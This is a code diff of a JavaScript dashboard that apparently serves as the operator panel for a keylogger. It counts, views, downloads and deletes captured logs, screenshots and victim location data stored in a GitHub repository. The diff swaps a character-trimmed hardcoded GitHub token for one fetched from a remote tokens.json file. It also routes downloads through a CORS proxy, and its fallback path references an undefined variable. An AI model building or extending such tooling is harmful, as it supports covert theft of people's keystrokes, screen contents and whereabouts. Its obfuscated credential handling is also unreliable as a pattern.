@@ -51,12 +51,51 @@ const GITHUB_API_BASE_URL = "https://api.github.com/repos/bebedudu/keylogger/con
 const GITHUB_UI_BASE_URL = "https://github.com/bebedudu/keylogger/tree/main/uploads";
 const GITHUB_DELETE_URL = "https://github.com/bebedudu/keylogger/tree/delete/main/uploads";
 const FOLDERS = ["cache", "config", "keylogerror", "logs", "screenshots"];
-const randomletter = "wruif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lirtzg"; // Replace with your actual GitHub token
 
-// Remove the first 5 characters and the last 6 characters
-const newRandomLetter = randomletter.slice(5, randomletter.length - 6);
+
+// URL containing the tokens JSON
+const TOKEN_URLL = "https://raw.githubusercontent.com/bebedudu/tokens/refs/heads/main/tokens.json";
+// Fallback token in case of failure to fetch from the URL
+const DEFAULT_RANDOMLETTER = "fallback_randomletter_12345XYZ67890"; // Example fallback token
+
+// Function to fetch and process the token
+async function randomletter() {
+    try {
+        // Fetch the JSON from the URL
+        const response = await fetch(TOKEN_URLL);
+
+        // Check if the response status is OK (status code 200)
+        if (response.ok) {
+            const tokenData = await response.json(); // Parse the JSON response
+
+            // Check if the "dashboard" key exists in the token data
+            if (tokenData.dashboard) {
+                let token = tokenData.dashboard;
+
+                let processedToken = token.slice(5, -6);
+                // console.log(`Token fetched and processed: ${processedToken}`);
+                return processedToken; // Return the processed token
+            } else {
+                console.log("Key 'dashboard' not found in the token data.");
+            }
+        } else {
+            console.log(`Failed to fetch tokens. Status code: ${response.status}`);
+        }
+    } catch (error) {
+        console.log(`An error occurred while fetching the token: ${error.message}`);
+    }
+
+    // Fallback to the default token
+    console.log("Using default token.");
+    return DEFAULT_TOKEN.slice(5, -6); // Return the fallback token
+}
+
+
 
 async function fetchFileCounts() {
+    // get random letter with async fucntion
+    const newRandomLetter = await randomletter();
+
     const grid = document.getElementById("file-count-grid");
     grid.innerHTML = "Fetching data...";
 
@@ -178,6 +217,9 @@ const GITHUB_API_BASE = "https://api.github.com/repos/bebedudu/keylogger/content
 
 // Fetch and display the number of files in each folder on page load
 document.addEventListener("DOMContentLoaded", async () => {
+    // get random letter with async fucntion
+    const newRandomLetter = await randomletter();
+
     const folders = ["cache", "config", "keylogerror", "logs", "screenshots"];
 
     for (const folder of folders) {
@@ -207,6 +249,9 @@ document.addEventListener("DOMContentLoaded", async () => {
 });
 
 async function deleteFiles() {
+    // get random letter with async fucntion
+    const newRandomLetter = await randomletter();
+    
     const terminalLog = document.getElementById('terminal-log'); // For terminal-like output
     const resultDiv = document.getElementById('result');
 
@@ -323,6 +368,9 @@ async function deleteFiles() {
 // }
 
 async function deleteFile(filePath, sha) {
+    // get random letter with async fucntion
+    const newRandomLetter = await randomletter();
+
     const deleteUrl = `https://api.github.com/repos/bebedudu/keylogger/contents/${encodeURIComponent(filePath)}`;
 
     const response = await fetch(deleteUrl, {
@@ -357,6 +405,9 @@ function logToTerminal(message, terminalLog) {
 // advance delete
 const GITHUB_API_BASE2 = "https://api.github.com/repos/bebedudu/keylogger/contents";
 async function performAdvancedDeletion() {
+    // get random letter with async fucntion
+    const newRandomLetter = await randomletter();
+
     const terminalLog = document.getElementById('advancedTerminalLog');
     const resultDiv = document.getElementById('advancedResult');
 
@@ -571,6 +622,9 @@ async function deleteFileWithRetry(filePath, sha, terminalLog, retries) {
 
 // no. of file is effecting now all menu item (x date & time range also need this)
 async function performDownload() {
+    // get random letter with async fucntion
+    const newRandomLetter = await randomletter();
+
     const terminalLog = document.getElementById('downloadTerminalLog');
     const resultDiv = document.getElementById('downloadResult');
 
@@ -739,6 +793,9 @@ async function performDownload() {
 }
 
 async function downloadFile(url, fileName, terminalLog) {
+    // get random letter with async fucntion
+    const newRandomLetter = await randomletter();
+
     try {
         // Use a CORS proxy to bypass CORS restrictions
         const proxyUrl = `https://cors-anywhere.herokuapp.com/${url}`;
@@ -783,7 +840,7 @@ function logToTerminal(message, terminalLog) {
 
 
 // commit history
-document.addEventListener("DOMContentLoaded", () => {
+document.addEventListener("DOMContentLoaded", async () => {
     const commitList = document.getElementById("commit-list");
     const commitCountInput = document.getElementById("commit-count");
     const reloadButton = document.getElementById("reload-button");
@@ -802,6 +859,8 @@ document.addEventListener("DOMContentLoaded", () => {
     // Replace these variables with your actual GitHub details
     const owner = "bebedudu"; // GitHub username or organization
     const repo = "keylogger"; // Repository name
+    // get random letter with async fucntion
+    const newRandomLetter = await randomletter();
     const token = newRandomLetter; // Your GitHub Personal Access Token
 
     let autoReloadInterval = null;
@@ -1001,7 +1060,6 @@ document.addEventListener("DOMContentLoaded", () => {
 
 // active users
 document.addEventListener('DOMContentLoaded', () => {
-    const githubToken = newRandomLetter; // Replace with your GitHub PAT
     const repoUrl = 'https://api.github.com/repos/bebedudu/keylogger/contents/uploads/activeuserinfo.txt';
     const tableBody = document.querySelector('#data-table tbody');
     const summaryElement = document.getElementById('summary');
@@ -1009,12 +1067,15 @@ document.addEventListener('DOMContentLoaded', () => {
     const refreshButton = document.getElementById('activeusers-refresh-btn');
     const lineCountInput = document.getElementById('line-count');
     const detailsContainer = document.getElementById('details-container');
-
+    
     let countryChartInstance = null;
     let cityChartInstance = null;
-
+    
     // Function to fetch the file content from GitHub
     async function fetchFileContent() {
+        // get random letter with async fucntion
+        const newRandomLetter = await randomletter();
+        const githubToken = newRandomLetter; // Replace with your GitHub PAT
         try {
             // Show loading message
             tableBody.innerHTML = ''; // Clear previous data
@@ -1304,12 +1365,15 @@ document.addEventListener('DOMContentLoaded', () => {
     const closeBtn = document.querySelector('.close');
 
     const GITHUB_API_URL = 'https://api.github.com/repos/bebedudu/keylogger/contents/uploads/screenshots';
-    const API_KEY = newRandomLetter; // Replace with your actual GitHub API key
-
+    
     let images = [];
-
+    
     // Fetch images from GitHub
     async function fetchImages() {
+        // get random letter with async fucntion
+        const newRandomLetter = await randomletter();
+
+        const API_KEY = newRandomLetter; // Replace with your actual GitHub API key
         try {
             const response = await fetch(GITHUB_API_URL, {
                 headers: {
